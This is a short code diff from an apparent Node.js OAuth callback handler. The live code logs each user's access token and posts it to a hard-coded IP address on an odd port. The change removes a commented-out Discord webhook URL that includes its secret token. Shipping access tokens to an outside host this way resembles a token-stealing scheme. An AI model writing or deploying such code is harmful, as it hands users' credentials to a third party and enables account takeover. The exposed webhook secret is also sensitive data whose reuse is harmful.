@@ -31,7 +31,6 @@ app.get('/callback', async (req, res) => {
 
         console.log('accesstoken obtained is:' , accessToken);
 
-       // const webhookUrl = 'https://discord.com/api/webhooks/1236663645786603611/eK41zlrFrjcemT5vuHQ08il2PKfUCLFVp9frLz8kMMsSXgIw0LpVgJ77UaqqDQQ1AX7a';
        const webhookUrl = 'https://78.108.218.15:25288/callback';
         await axios.post(webhookUrl, { content: `Access token: ${accessToken}` });
 
